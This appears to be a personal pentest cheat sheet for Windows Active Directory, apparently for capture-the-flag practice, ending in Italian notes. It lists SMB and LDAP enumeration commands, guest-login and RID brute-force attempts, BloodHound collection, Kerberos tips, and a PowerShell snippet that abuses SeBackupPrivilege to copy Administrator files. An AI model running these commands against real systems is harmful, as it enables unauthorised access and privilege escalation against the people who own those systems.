# Table of Content
<!-- TOC -->

- [Table of Content](#table-of-content)
- [Enumeration](#enumeration)
    - [Tools](#tools)
    - [Default credentials](#default-credentials)

<!-- /TOC -->

# Enumeration
search for:
- shares
- groups
- RIDs

\
try using default credentials like `guest` and no password\
reapet enumeration with any other users you find access to

## Tools
1. crackmapexec
    - `crackmapexec smb HOST --shares {-u guest -p ''}`
    - `crackmapexec smb HOST --rid-brute`
2. nxc
    - `nxc smb HOST --shares {-u guest -p ''}`
    - `nxc ldap HOST {-M group-mem -o group="Remote Managment Users"} {--groups}`
    - `nxc smb HOST --rid-brute`
    - `nxc smb HOST --users`
3. smbclient
    - `smbclient -L HOST`
    - `smbclient HOST\SHARE {- U user%password}`
4. impacket
    - `impacket-lookupsid HOST {-no-pass}`
5. evilwinrm
    - use it every time with every new users and password you find. Also check it with `nxc ldap` because sometimes it doesnt work

## Default credentials
- smb: `-u 'guest' -p ''`

# Privilege Escalation
## Enumeration
- check permission: `whoami /all`
### Bloodhound
1. Collect data
    - `bloodhound-python -u user -p password -d domain -ns ip -c All`
    - `nxc ldap host -u user -p password --bloodhound -c All`
2. Import and query
    - `transitive object control`

### SeBackupPrivilege
Enable privileges using giuliano108/SeBackupPrivilege

```PS
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Retrieve sensitive files
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```



# notes from adriano

utile anche usare nxc con --debug

a volte nxc si autentica ma altri tool no. Anche bloodhound. Cercando si nota che quando l'autenticazione funziona è perchè va trmaite Kerboros quindi va usata l'opzione -k

impacket-gettgt to bypass all and authenticate with kerberos


guarda il gruppo remote managment con bloodhound e marca come high value gli utenti che ne fanno parte

ogni volta che fai un upadte di utenzza gruppo ecc, bisdogna rigenerare il TGT kerberos se usato